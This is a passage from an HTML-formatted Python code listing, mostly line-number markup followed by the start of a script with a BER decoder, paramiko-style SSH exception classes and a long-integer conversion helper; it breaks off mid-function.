class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> hashlib <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> md5 <span class="keyword">import</span> md5 <span class="keyword">as</span> MD5</span><br><span class="line"></span><br><span class="line">limited = <span class="literal">True</span>  <span class="comment"># set to False for &quot;development&quot; mode!</span></span><br><span class="line"></span><br><span class="line">PY3 = sys.version_info[<span class="number">0</span>] == <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> PY3:</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> StringIO <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3, AES</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    AES = Object()</span><br><span class="line">    AES.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    DES3 = Object()</span><br><span class="line">    DES3.MODE_CBC = <span class="string">&quot;&quot;</span></span><br><span class="line">    limited = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BERException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BER</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Robey&#x27;s tiny little attempt at a BER decoder.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, content=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.content = content</span><br><span class="line">        self.idx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;BER(\&#x27;&#x27;</span> + repr(self.content) + <span class="string">&#x27;\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.decode_next()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_next</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ident = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (ident &amp; <span class="number">31</span>) == <span class="number">31</span>:</span><br><span class="line">            <span class="comment"># identifier &gt; 30</span></span><br><span class="line">            ident = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> self.idx &lt; len(self.content):</span><br><span class="line">                t = ord(self.content[self.idx])</span><br><span class="line">                self.idx += <span class="number">1</span></span><br><span class="line">                ident = (ident &lt;&lt; <span class="number">7</span>) | (t &amp; <span class="number">0x7f</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (t &amp; <span class="number">0x80</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># now fetch length</span></span><br><span class="line">        size = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> size &amp; <span class="number">0x80</span>:</span><br><span class="line">            <span class="comment"># more complimicated...</span></span><br><span class="line">            <span class="comment"># <span class="doctag">FIXME:</span> theoretically should handle indefinite-length (0x80)</span></span><br><span class="line">            t = size &amp; <span class="number">0x7f</span></span><br><span class="line">            <span class="keyword">if</span> self.idx + t &gt; len(self.content):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            size = inflate_long(self.content[self.idx: self.idx + t], <span class="literal">True</span>)</span><br><span class="line">            self.idx += t</span><br><span class="line">        <span class="keyword">if</span> self.idx + size &gt; len(self.content):</span><br><span class="line">            <span class="comment"># can&#x27;t fit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        data = self.content[self.idx: self.idx + size]</span><br><span class="line">        self.idx += size</span><br><span class="line">        <span class="comment"># now switch on id</span></span><br><span class="line">        <span class="keyword">if</span> ident == <span class="number">0x30</span>:</span><br><span class="line">            <span class="comment"># sequence</span></span><br><span class="line">            <span class="keyword">return</span> self.decode_sequence(data)</span><br><span class="line">        <span class="keyword">elif</span> ident == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># int</span></span><br><span class="line">            <span class="keyword">return</span> inflate_long(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 1: boolean (00 false, otherwise true)</span></span><br><span class="line">            <span class="keyword">raise</span> BERException(<span class="string">&#x27;Unknown ber encoding type %d (robey is lazy)&#x27;</span> % ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_sequence</span>(<span class="params">data</span>):</span></span><br><span class="line">        out = []</span><br><span class="line">        b = BER(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            x = b.decode_next()</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out.append(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    decode_sequence = staticmethod(decode_sequence)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSHException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised by failures in SSH2 protocol negotiation or logic errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when authentication failed for some reason.  It may be</span></span><br><span class="line"><span class="string">    possible to retry with different credentials.  (Other classes specify more</span></span><br><span class="line"><span class="string">    specific reasons.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordRequiredException</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when a password is needed to unlock a private key file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadAuthenticationType</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an authentication type (like password) is used, but</span></span><br><span class="line"><span class="string">    the server isn&#x27;t allowing that type.  (It may only allow public-key, for</span></span><br><span class="line"><span class="string">    example.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar allowed_types: list of allowed authentication types provided by the</span></span><br><span class="line"><span class="string">        server (possible values are: C&#123;&quot;none&quot;&#125;, C&#123;&quot;password&quot;&#125;, and</span></span><br><span class="line"><span class="string">        C&#123;&quot;publickey&quot;&#125;).</span></span><br><span class="line"><span class="string">    @type allowed_types: list</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, explanation, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, explanation)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> SSHException.__str__(self) + <span class="string">&#x27; (allowed_types=%r)&#x27;</span> % self.allowed_types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PartialAuthentication</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    An internal exception thrown in the case of partial authentication.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, <span class="string">&#x27;partial authentication&#x27;</span>)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChannelException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an attempt to open a new L&#123;Channel&#125; fails.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar code: the error code returned by the server</span></span><br><span class="line"><span class="string">    @type code: int</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, code, text</span>):</span></span><br><span class="line">        SSHException.__init__(self, text)</span><br><span class="line">        self.code = code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadHostKeyException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    The host key given by the SSH server did not match what we were expecting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar hostname: the hostname of the SSH server</span></span><br><span class="line"><span class="string">    @type hostname: str</span></span><br><span class="line"><span class="string">    @ivar key: the host key presented by the server</span></span><br><span class="line"><span class="string">    @type key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">    @ivar expected_key: the host key expected</span></span><br><span class="line"><span class="string">    @type expected_key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hostname, got_key, expected_key</span>):</span></span><br><span class="line">        SSHException.__init__(self, <span class="string">&#x27;Host key for server %s does not match!&#x27;</span> % hostname)</span><br><span class="line">        self.hostname = hostname</span><br><span class="line">        self.key = got_key</span><br><span class="line">        self.expected_key = expected_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inflate_long</span>(<span class="params">s, always_positive=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;turns a normalized byte string into a long-int</span></span><br><span class="line"><span class="string">    (adapted from Crypto.Util.number)&quot;&quot;&quot;</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> always_positive <span class="keyword">and</span> (len(s) &gt; <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">        negative = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">4</span>:</span><br><span class="line">        filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> negative:</span><br><span class="line">            filler = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">        s = filler * (<span class="number">4</span> - len(s) % <span class="number">4</span>) + s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        out = (out &lt;&lt; <span class="number">32</span>) + struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, s[i:i + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> negative:</span><br><span class="line">        out -= (<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * len(s)))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflate_long</span>(<span class="params">n, add_sign_padding=True</span>):</span></span><br><span class="line">    <span class="string">&quot;turns a long-int into a normalized byte string 